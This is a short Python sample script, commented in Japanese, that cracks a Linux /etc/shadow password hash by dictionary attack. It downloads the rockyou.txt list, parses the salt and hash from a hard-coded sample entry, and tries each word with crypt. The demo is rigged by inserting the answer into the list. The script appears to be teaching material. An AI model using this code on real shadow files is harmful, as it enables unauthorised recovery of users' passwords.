# coding: utf-8
"""_summary_
/etc/shadowハッシュに対する辞書攻撃を行うサンプル
NOTE: /etc/shadowのハッシュ化はcryptというライブラリで行われている。
"""
import crypt
import requests
import re
from typing import Union, List


def get_rockyou_list(url: str) -> Union[None, List[str]]:
    """_summary_

    Args:
        url (str): rockyou.txt url

    Returns:
        password_list (List[str])
    """
    print(f"DOWNLOADING PASSWORD LIST...\n{url}")
    response = requests.get(url)

    if response.status_code == 200:
        password_list = response.text.splitlines()
        return password_list
    else:
        print(f"Error: Failed to download file (status code: {response.status_code})")
        return None


def main():
    # FIXME: shadowには/etc/shadowの一行をそのままコピペする
    shadow = "sigma:$6$supersugoisaltda$aGNLnFiImN.8qxP2VoYYCR0Q57uwPsU1ECrLCiTw9A5y68PZKCSsx9J1.EyTjdEwvfF.eJI7.4RlcA4Hswl2./:18765:0:99999:7:::"  # FIXME: this is sample

    match = re.match(r'.*\:(\$[0-9]\$)(\S+)\$(\S+)', shadow)
    hash_algorithm = match.group(1)  # $1$ = MD5，$2$ = Blowfish，$5$ = sha256，$6$ = sha512
    salt = match.group(2)
    hash_part = match.group(3).split(':')[0] # NOTE: ハッシュ部分より後ろをsplitで削除している
    print(f"TARGET SHADOW INFO={hash_algorithm}, {salt}, {hash_part}")
    target_hash = hash_algorithm + salt + "$" + hash_part

    rockyou_url = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    password_list = get_rockyou_list(rockyou_url)
    password_list[7] = "h0b1gsy6"

    # password listのpasswordを使ってhashを生成して一致するまで試す
    for pw in password_list:
        tmp_hash = crypt.crypt(pw, hash_algorithm + salt)
        print(f"{pw}, {tmp_hash}")
        if tmp_hash == target_hash:
            print(f"=====CONGRATURATION!!! RAW PASSWORD IS\n{pw}\n=====")
            break


if __name__ == "__main__":
    main()
